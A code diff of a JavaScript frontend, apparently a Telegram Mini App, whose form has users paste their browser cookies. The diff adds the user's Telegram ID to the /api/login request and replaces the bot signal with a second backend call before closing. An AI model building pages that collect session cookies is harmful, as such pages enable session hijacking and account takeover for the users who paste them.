@@ -4,14 +4,13 @@ app.ready();
 const statusMsg = document.getElementById("status-message");
 const field = document.getElementById("field");
 
-field.addEventListener("submit", async function(event) {
+field.addEventListener("submit", async function (event) {
   event.preventDefault();
-  
+
   const cookies = document.getElementById("cookies").value;
   const tgId = app.initDataUnsafe?.user?.id || "unknown_test_user";
 
   if (!cookies) {
-    statusMsg.innerText = "Please enter your cookies.";
     return;
   }
 
@@ -21,7 +20,8 @@ field.addEventListener("submit", async function(event) {
     const response = await fetch("/api/login", {
       method: "POST",
       body: JSON.stringify({
-        cookies: cookies
+        cookies: cookies,
+        telegram_id: tgId,
       }),
       headers: {
         "Content-type": "application/json",
@@ -31,10 +31,21 @@ field.addEventListener("submit", async function(event) {
     const result = await response.json();
     if (result.success) {
       statusMsg.innerText = "Success! Logged in securely.";
-      
-      // close the app and send a signal back to the bot
-      setTimeout(() => {
-        app.sendData(JSON.stringify({ event: "login_success" }));
+
+      setTimeout(async () => {
+        try {
+          await fetch("/api/login-success", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              userId: tgId,
+            }),
+          });
+
+          app.close();
+        } catch (err) {
+          console.error("Failed to send login success:", err);
+        }
       }, 1500);
     } else {
       statusMsg.innerText = "Error: " + (result.message || "Invalid cookies.");
